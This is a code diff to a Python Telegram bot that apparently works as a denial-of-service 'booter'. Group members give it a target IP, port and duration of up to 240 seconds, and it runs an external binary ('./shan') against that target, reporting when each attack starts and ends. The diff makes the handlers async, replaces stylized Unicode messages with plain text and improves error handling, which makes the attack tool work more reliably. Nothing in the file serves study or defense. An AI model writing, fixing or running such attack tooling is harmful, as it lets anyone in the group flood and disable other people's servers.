@@ -3,6 +3,7 @@ import time
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 import threading
+import asyncio
 
 # Global variables
 attack_in_progress = False
@@ -11,14 +12,16 @@ attack_lock = threading.Lock()
 
 def restrict_to_group(func):
     """Decorator to ensure commands are only used in a specific group."""
-    def wrapper(update: Update, context: CallbackContext):
+    async def wrapper(update: Update, context: CallbackContext):
         specific_group_id = -1002186135876  # Replace with your group's chat ID
         if update.effective_chat.id != specific_group_id:
-            context.bot.send_message(chat_id=update.effective_chat.id,
-                                     text="This bot is usable only in a specific group. Join here: [Channel Link](https://t.me/+ZIisNQHB4apmNTM1)",
-                                     parse_mode="Markdown")
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="This bot is usable only in a specific group. Join here: [Channel Link](https://t.me/+ZIisNQHB4apmNTM1)",
+                parse_mode="Markdown",
+            )
             return
-        return func(update, context)
+        return await func(update, context)
     return wrapper
 
 @restrict_to_group
@@ -54,34 +57,39 @@ async def attack(update: Update, context: CallbackContext):
             return
 
         if time_duration > 240:
-            await update.message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙖 𝙩𝙞𝙢𝙚 𝙤𝙛 240 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙤𝙧 𝙡𝙚𝙨𝙨.")
+            await update.message.reply_text("Please use a time of 240 seconds or less.")
             return
 
         # Check and set attack state with lock
         with attack_lock:
             if attack_in_progress:
-                await update.message.reply_text(f"𝘼𝙣 𝙖𝙩𝙩𝙖𝙘𝙠 𝙞𝙨 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙞𝙣 𝙥𝙧𝙤𝙜𝙧𝙚𝙨𝙨. 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝙩𝙞𝙢𝙚: {remaining_time} 丂𝑒ĆØ𝐍𝓭丂.")
+                await update.message.reply_text(
+                    f"An attack is currently in progress. Remaining time: {remaining_time} seconds."
+                )
                 return
 
             attack_in_progress = True
             remaining_time = time_duration
-            await update.message.reply_text(f"ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋ ɪɴᴠᴀꜱɪᴏɴ\n ɪᴘ - {ip}:\n ᴘᴏʀᴛ - {port} ꜰᴏʀ {time_duration} ꜱᴇᴄᴏɴᴅꜱ ʜᴀꜱ ꜱᴛᴀʀᴛᴇᴅ.")
+            await update.message.reply_text(
+                f"Your attack has started:\nIP: {ip}\nPort: {port}\nDuration: {time_duration} seconds."
+            )
 
         async def run_attack():
             global attack_in_progress, remaining_time
             try:
                 subprocess.run(["./shan", ip, port, str(time_duration)], check=True)
+            except subprocess.CalledProcessError as e:
+                await update.message.reply_text(f"Error executing attack: {e}")
             except Exception as e:
-                print(f"Error executing attack: {e}")
+                await update.message.reply_text(f"Unexpected error: {e}")
             finally:
-                # Reset state after attack
                 with attack_lock:
                     attack_in_progress = False
                     remaining_time = 0
-                await update.message.reply_text(f"Yσυɾ αƚƚαƈƙ σɳ {ip}\n ʜᴀꜱ ᴄᴏɴᴄʟᴜᴅᴇᴅ ᴀꜰᴛᴇʀ {time_duration} ꜱᴇᴄᴏɴᴅꜱ.")
+                await update.message.reply_text(f"Attack on {ip}:{port} completed after {time_duration} seconds.")
 
-        # Start the subprocess in a separate thread
-        threading.Thread(target=run_attack).start()
+        # Start the subprocess in an async context
+        asyncio.create_task(run_attack())
 
     except Exception as e:
         await update.message.reply_text(f"An error occurred: {e}")
@@ -94,7 +102,7 @@ async def status(update: Update, context: CallbackContext):
         if attack_in_progress:
             await update.message.reply_text(f"An attack is currently in progress. Remaining time: {remaining_time} seconds.")
         else:
-            await update.message.reply_text("☀️The attack system is ready to go.☀️")
+            await update.message.reply_text("The attack system is ready to go.")
 
 def main():
     # Replace 'YOUR_TOKEN' with your bot's API token
@@ -109,4 +117,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
